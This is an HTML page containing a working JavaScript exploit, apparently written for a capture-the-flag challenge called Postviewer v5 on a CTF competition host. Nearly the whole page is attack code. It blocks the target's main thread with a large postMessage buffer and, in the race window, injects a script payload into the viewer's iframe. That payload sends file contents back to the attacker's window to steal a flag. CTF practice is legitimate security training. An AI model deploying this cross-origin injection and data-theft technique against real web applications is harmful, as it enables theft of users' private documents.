<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Postviewer v5 FF Exploit</title>
</head>
<body>
    <h1>Postviewer v5 FF Exploit</h1>
    <button onclick="runExploit()">Click to Run Exploit</button>
    <iframe style="width:1px;height:1px" name="loop"></iframe>
    <pre id="log"></pre>

    <script>
        const TARGET_URL = 'https://eghbhvjs-postviewer5-ff.instancer.2025.ctfcompetition.com';
        const sleep = (d) => new Promise((r) => setTimeout(r, d));
        
        function log(...args) {
            console.log(...args);
            document.getElementById('log').innerText += args.join(' ') + '\n';
        }

        async function load(win, url) {
            log('Loading:', url);
            
            // Create large buffer to slow down the main thread
            const buffer = new Uint8Array(1e7);
            
            win.location = 'about:blank';
            
            // Wait for window to be ready
            await new Promise((resolve) => {
                loop.onmessage = () => {
                    try {
                        win.origin;
                        resolve();
                    } catch (e) {
                        loop.postMessage(null);
                    }
                };
                loop.postMessage(null);
            });

            win.location = url;
            
            // Wait for iframe to load and race condition
            await new Promise((resolve) => {
                loop.onmessage = () => {
                    if (win.length === 1) {
                        log('Found iframe, starting race condition attack');
                        
                        // Send huge message to block main thread
                        win?.postMessage(buffer, '*', [buffer.buffer]);
                        
                        // Send exploit payload to iframe after delay
                        setTimeout(() => {
                            log('Sending exploit payload to iframe');
                            
                            const exploitPayload = {
                                body: `<script>
                                    console.log('Exploit iframe loaded!');
                                    
                                    // Listen for messages containing file data
                                    onmessage = async (e) => {
                                        console.log('Received message in exploit iframe:', e.data);
                                        
                                        if (e.data && e.data.body) {
                                            try {
                                                let text;
                                                if (typeof e.data.body === 'string') {
                                                    text = e.data.body;
                                                } else if (e.data.body.text) {
                                                    text = await e.data.body.text();
                                                } else {
                                                    text = e.data.body.toString();
                                                }
                                                
                                                console.log('Extracted text:', text);
                                                
                                                // Send stolen data back to parent
                                                if (parent && parent.opener) {
                                                    parent.opener.postMessage({
                                                        stolen: text,
                                                        type: 'flag_data'
                                                    }, '*');
                                                }
                                            } catch (err) {
                                                console.error('Error processing message:', err);
                                            }
                                        }
                                    };
                                <\/script>`,
                                mimeType: "text/html"
                            };
                            
                            win[0]?.postMessage(exploitPayload, "*");
                            resolve();
                        }, 500);
                    } else {
                        loop.postMessage(null);
                    }
                };
                loop.postMessage(null);
            });
        }

        function waitForMessage(url) {
            return new Promise(async resolve => {
                // Set up message listener for stolen data
                const messageHandler = (e) => {
                    if (e.data && e.data.type === 'flag_data') {
                        log('STOLEN DATA:', e.data.stolen);
                        if (e.data.stolen.includes('CTF{')) {
                            log('ðŸš© FLAG FOUND:', e.data.stolen);
                            alert('FLAG FOUND: ' + e.data.stolen);
                        }
                        resolve(false);
                    }
                };
                
                window.addEventListener('message', messageHandler);
                
                try {
                    const rnd = 'a' + Math.random().toString(16).slice(2);
                    const _url = url + ',' + rnd;
                    await load(win, _url);
                    
                    // Timeout after 2 seconds
                    setTimeout(() => {
                        window.removeEventListener('message', messageHandler);
                        resolve(true);
                    }, 2000);
                } catch (err) {
                    log('Error in waitForMessage:', err);
                    window.removeEventListener('message', messageHandler);
                    resolve(true);
                }
            });
        }

        let win;

        async function runExploit() {
            log('Starting exploit...');
            
            if (!win || win.closed) {
                win = open('about:blank', 'hack', 'width=800,height=300,top=500');
                log('Opened new window');
            }

            // Try different file indices - the flag should be one of the first files
            for (let i = 1; i <= 10; i++) {
                log(`Trying file index ${i}`);
                
                // Use CSS selector to target specific file elements
                const url = `${TARGET_URL}/#a,.list-group-item:nth-child(${i})`;
                
                let shouldContinue = true;
                let attempts = 0;
                
                while (shouldContinue && attempts < 3) {
                    attempts++;
                    log(`Attempt ${attempts} for file ${i}`);
                    shouldContinue = await waitForMessage(url);
                    
                    if (!shouldContinue) {
                        log(`Successfully processed file ${i}`);
                        break;
                    }
                }
                
                // Small delay between attempts
                await sleep(1000);
            }
            
            log('Exploit finished');
        }

        // Auto-run on page load for convenience
        window.addEventListener('load', () => {
            log('Page loaded, ready to run exploit');
        });
    </script>
</body>
</html>
